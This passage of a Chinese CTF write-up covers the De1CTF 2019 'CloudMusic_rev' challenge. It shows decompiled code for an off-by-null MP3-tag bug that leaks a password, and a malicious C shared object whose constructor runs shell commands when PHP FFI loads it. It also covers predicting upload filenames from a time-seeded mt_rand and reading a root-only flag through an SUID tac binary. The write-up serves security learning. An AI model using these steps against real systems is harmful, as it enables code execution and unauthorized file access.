+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">void *init_proc()</span><br><span class="line">&#123;</span><br><span class="line">  mframe_size = 0;</span><br><span class="line">  mframe_data = &amp;mem_mframe_data;</span><br><span class="line">  memset(&amp;mem_mframe_data, 0, 0x70uLL);</span><br><span class="line">  passwd[0] = &amp;mem_mpasswd;</span><br><span class="line">  return memset(&amp;mem_mpasswd, 0, 0x20uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里将<code>mframe_data</code>指向<code>mem_mframe_data</code>，<code>passwd[0]</code>指向<code>mem_mpasswd</code></p>
+<p>接着读<code>check_password()</code>，这个函数用来读取并检查输入的密码是否正确。主要看这个地方</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">stream = fopen(&amp;s, &quot;r&quot;);</span><br><span class="line">if ( !stream )</span><br><span class="line">return 0LL;</span><br><span class="line">fread(passwd[0], 1uLL, 0x18uLL, stream);</span><br><span class="line">fclose(stream);</span><br><span class="line">return strcmp(passwd[0], a1) == 0;</span><br></pre></td></tr></table></figure>
+<p>这里将取出的密码保存到了<code>passwd[0]</code>指向的地址，也就是<code>mem_mpasswd</code>。不过整个过程中仅有最后比较的时候使用了传入的<code>a1</code>，没有什么可以插手的地方，应该利用不了</p>
+<p>回到<code>parse()</code>，下面判断classname是什么并分别进入不同函数<br>于是先进入<code>read_title()</code>看看，这个函数应该是用来获取歌曲的title</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 __fastcall read_title(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int64 result; // rax</span><br><span class="line">  const char *v2; // rax</span><br><span class="line">  signed int *v3; // rax</span><br><span class="line">  signed int *v4; // [rsp+18h] [rbp-18h]</span><br><span class="line"></span><br><span class="line">  result = load_tag(a1);</span><br><span class="line">  if ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = tag_get_title(result);</span><br><span class="line">    v3 = parse_text_frame_content(v2);</span><br><span class="line">    v4 = v3;</span><br><span class="line">    result = strlen(*(v3 + 1));</span><br><span class="line">    if ( result &lt;= 0x70 )</span><br><span class="line">    &#123;</span><br><span class="line">      mframe_size = strlen(*(v4 + 1));</span><br><span class="line">      result = strcpy(&amp;mem_mframe_data, *(v4 + 1));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>load_tag()</code>应该是将文件读取出来</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">const char *__fastcall tag_get_title(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  const char *result; // rax</span><br><span class="line"></span><br><span class="line">  if ( a1 )</span><br><span class="line">    result = get_from_list(*(a1 + 16), &quot;TIT2&quot;);</span><br><span class="line">  else</span><br><span class="line">    result = 0LL;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后在<code>tag_get_title()</code>返回TIT2（mp3头部记录作者的标签）的位置<br><code>parse_text_frame_content()</code>猜测是将TIT2对应的起始地址+10(标签帧头长度),然后将赋给<code>result</code>该位置的内容，也就是TIT2的内容数据。然后<code>result</code>获得TIT2的大小(<code>v3+1</code>的原因是第一位是用来记录是什么编码)，判断是否大于0x70，大于直接返回<code>result</code>。否则将TIT2的内容数据复制给<code>mem_mframe_data</code></p>
+<p>这里pwn师傅说一般碰到这种情况首先回去尝试一下边界值，结果也确实是可以，但还是分析一下原因<br>这里要利用的是<code>off by null</code>，<code>parse()</code>处最终是返回了<code>mframe_data</code>的地址，也就是<code>mem_mframe_data</code></p>
+<p><img src="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/f3baf91044dcabece8ceddfc3a2915d6.png" alt=""></p>
+<p>我们查看一下可以看到<code>mframe_data</code>地址在bbs段上的9390处</p>
+<p><img src="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/a1c9c08fa31e6f8a92220a1126f34a80.png" alt=""></p>
+<p>而<code>mem_mframe_data</code>的地址在bbs段上的9320处</p>
+<p>可以发现，两个数据的地址的差正好是0x70，也就是说只要mp3的大小大于0x70，就能够覆盖掉<code>mframe_data</code>的指向地址，就可以控制返回的数据<br>但这里限制了大小为0x70，无法让mp3的数据大于0x70。这时就要利用一下<code>strlen()</code>和<code>strcpy()</code>对字符串的处理的一些细节。<code>strlen()</code>虽然是遇到/x00停止计算长度，但不会将/x00计入长度之中；而<code>strcpy()</code>则是会将/x00一同给复制。这样的结果就是，尽管strlen()计算的长度为0x70，但<code>strcpy()</code>复制的长度为0x71，/x00就溢出到了mframe_data处<br>此时由于<code>mframe_data</code>储存的是<code>mem_mframe_data</code>的地址，而且是以小端保存，因此保存的地址会从9320修改成9300，然后看看9300处</p>
+<p><img src="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/489fb28e95aa1a13b257f636371a4563.png" alt=""></p>
+<p>正好是password保存的位置，于是将password读出返回了</p>
+<p>这里pwn师傅说bbs段虽然并不是真实地址，但也是相对地址，因此修改最后几位依旧可以保证指向的地址正确</p>
+<p>然后构造一个符合要求的mp3文件，要注意几点的是，需要有<code>title artist album这</code>几个标签。同时对于要溢出的标签，大小不能只设为72(要计上编码和0x00)，因为密码也要占用长度。所以可以将长度设大一些，然后在第72位的0x00后补足长度的字符即可</p>
+<p><img src="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/ce067b6270591ca5783f92c27f1d88eb.png" alt=""></p>
+<p>这是构造出来的mp3，TPE1的第72位为0x00，然后往后补足到了0xA1位</p>
+<p><img src="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/ac3aa710d01bfd7638c75a2aa4c273ea.png" alt=""></p>
+<p>上传一下，成功获得密码，进入firmware界面</p>
+<p><img src="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/b4ae6b8bba7048702da710975ff80e82.png" alt=""></p>
+<p>一个上传和调试的接口，回去读一下源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_FILES[&quot;file_data&quot;]))&#123;</span><br><span class="line">    if ($_FILES[&quot;file_data&quot;][&quot;error&quot;] &gt; 0||$_FILES[&quot;file_data&quot;][&quot;size&quot;] &gt; 1024*1024*1)&#123;</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        die(json_encode(array(&apos;status&apos;=&gt;0,&apos;info&apos;=&gt;&apos;upload err, maximum file size is 1MB.&apos;)));</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        mt_srand(time());</span><br><span class="line">        $firmware_filename=md5(mt_rand().$_SERVER[&apos;REMOTE_ADDR&apos;]);</span><br><span class="line">        $firmware_filename=__DIR__.&quot;/../uploads/firmware/&quot;.$firmware_filename.&quot;.elf&quot;;</span><br></pre></td></tr></table></figure>
+<p>上传部分会将文件保存为elf，那就是要上传一个so文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">if (isset($path))&#123;</span><br><span class="line">    $path=clean_string(trim((string) $path));</span><br><span class="line">    if (strlen($path)&lt;=0||strlen($path)&gt;64)&#123;</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        die(json_encode(array(&apos;status&apos;=&gt;0,&apos;info&apos;=&gt;&apos;Format or length check failed.&apos;)));</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $firmware_filename=__DIR__.&quot;/../uploads/firmware/&quot;.$path.&quot;.elf&quot;;</span><br><span class="line">        if (!file_exists($firmware_filename))&#123;</span><br><span class="line">            ob_end_clean();</span><br><span class="line">            die(json_encode(array(&apos;status&apos;=&gt;0,&apos;info&apos;=&gt;&apos;File not found.&apos;)));</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            try&#123;</span><br><span class="line">                $elf = FFI::cdef(&quot;</span><br><span class="line">                    extern char * version;</span><br><span class="line">                &quot;, $firmware_filename);</span><br><span class="line">                $version=(string) FFI::string($elf-&gt;version);</span><br><span class="line">                if ($version === &quot;cloudmusic_rev&quot;)&#123;</span><br><span class="line">                    ob_end_clean();</span><br><span class="line">                    die(json_encode(array(&apos;status&apos;=&gt;1,&apos;info&apos;=&gt;&apos;Firmware version is cloudmusic_rev.&apos;)));</span><br><span class="line">                &#125;else&#123;</span><br><span class="line">                    ob_end_clean();</span><br><span class="line">                    die(json_encode(array(&apos;status&apos;=&gt;0,&apos;info&apos;=&gt;&apos;Bad version.&apos;)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;catch(Error $e)&#123;</span><br><span class="line">                ob_end_clean();</span><br><span class="line">                die(json_encode(array(&apos;status&apos;=&gt;0,&apos;info&apos;=&gt;&apos;Fail when loading firmware.&apos;)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>调试部分则是会去获得文件的version，但只是返回固定的信息，，这里可以利用<code>__attribute__((constructor))</code> 。之前写C时没用过，不过看得出是个类似于构造函数的东西，实际上用途也是被设定为该属性的函数，会在<code>main()</code>执行前执行【同时也有个类似析构函数的用法】<br>于是我们可以构造文件，让其中有一个函数为<code>__attribute__((constructor))</code>。那么只要使用了这个文件，那就会执行函数得以RCE</p>
+<p>先构造好文件，由于没有回显，那就将内容保存到web目录下。尝试了几次在uploads下那几个目录能写，web根目录和uploads目录是写不了的<br>先读一下根目录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">char _version[0x130];</span><br><span class="line">char * version = &amp;_version;</span><br><span class="line"></span><br><span class="line">__attribute__ ((constructor)) void flag()&#123;</span><br><span class="line">    memset(version,0,0x130);</span><br><span class="line">    FILE * fp=popen(&quot;/usr/bin/tac /flag &gt; /var/www/html/uploads/firmware/flag.txt &quot;, &quot;r&quot;);</span><br><span class="line">    if (fp==NULL) return;</span><br><span class="line">    fread(version, 1, 0x100, fp);</span><br><span class="line">    pclose(fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后编译为so文件，本来以为so文件可以<code>gcc -c x.c -o x.so</code>这样生成，上传后一直用不了很懵逼。后来尝试去调试时才发现so要用动态文件的生成方式生成，记一下命令<code>gcc x.c -fPIC -shared -o x.so</code></p>
+<p>上传so，然后去计算文件的位置<br><code>time()</code>的值可以通过抓包获取服务器的时间</p>
+<p><img src="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/012ad61e997f63d535216e680a1c6b48.png" alt=""></p>
+<p><code>$_SERVER[&#39;REMOTE_ADDR&#39;]</code>查看自己的公网ip即可<br>不过这里由于php7对<code>mt_rand()</code>的算法有改动，所以要使用php7以上去生成</p>
+<p>然后调试so文件</p>
+<p><img src="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/9e433a807da55cf9667fdcdc54b14b51.png" alt=""></p>
+<p>看到这样就是成功了</p>
+<p>访问一下</p>
+<p><img src="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/aa93c4ff3b432959bbf68c1f07194e8a.png" alt=""></p>
+<p>flag在根目录，然后<code>cat /flag &gt; /var/www/html/uploads/firmware/flag.txt</code></p>
+<p><img src="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/190885bc76197813cda74cc78cecb6bb.png" alt=""></p>
+<p>发现什么都没读到，猜测可能是权限的问题，于是<code>ls -l / &gt; /var/www/html/uploads/firmware/ls-l.txt</code></p>
+<p><img src="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/d58d0cec71c6b8b0374b3311c6d3998a.png" alt=""></p>
+<p>确实不够权限去读取flag，需要找一个有suid权限的程序去读取。<code>/usr/bin/tac</code>的权限为suid，而tac和cat不同的只是从最后一行读起而已。这里flag只有一行问题不大，于是<code>/usr/bin/tac /flag &gt; /var/www/html/uploads/firmware/getflag.txt</code></p>
+<p><img src="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/98804055f70a843d728d292e1192492e.png" alt=""></p>
+<p>得到flag</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/web/" rel="tag"># web</a>
+          
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/08/07/RSA/" rel="next" title="神奇的RSA">
+                <i class="fa fa-chevron-left"></i> 神奇的RSA
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="http://shifeng-kaze.cn/blog/head/kotori.jpg" alt="k0t0r1">
+            
+              <p class="site-author-name" itemprop="name">k0t0r1</p>
+              <p class="site-description motion-element" itemprop="description">～いらっしゃいません～</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">19</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://shifeng-kaze.cn/" title="shifeng-kaze" target="_blank">shifeng-kaze</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://aluvion.github.io" title="Aluvion" target="_blank">Aluvion</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF-Me"><span class="nav-number">1.</span> <span class="nav-text">SSRF Me</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#9calc"><span class="nav-number">2.</span> <span class="nav-text">9calc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ShellShellShell"><span class="nav-number">3.</span> <span class="nav-text">ShellShellShell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Giftbox"><span class="nav-number">4.</span> <span class="nav-text">Giftbox</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CloudMusic-rev"><span class="nav-number">5.</span> <span class="nav-text">CloudMusic_rev</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">k0t0r1</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+  
+
+</body>
+</html>
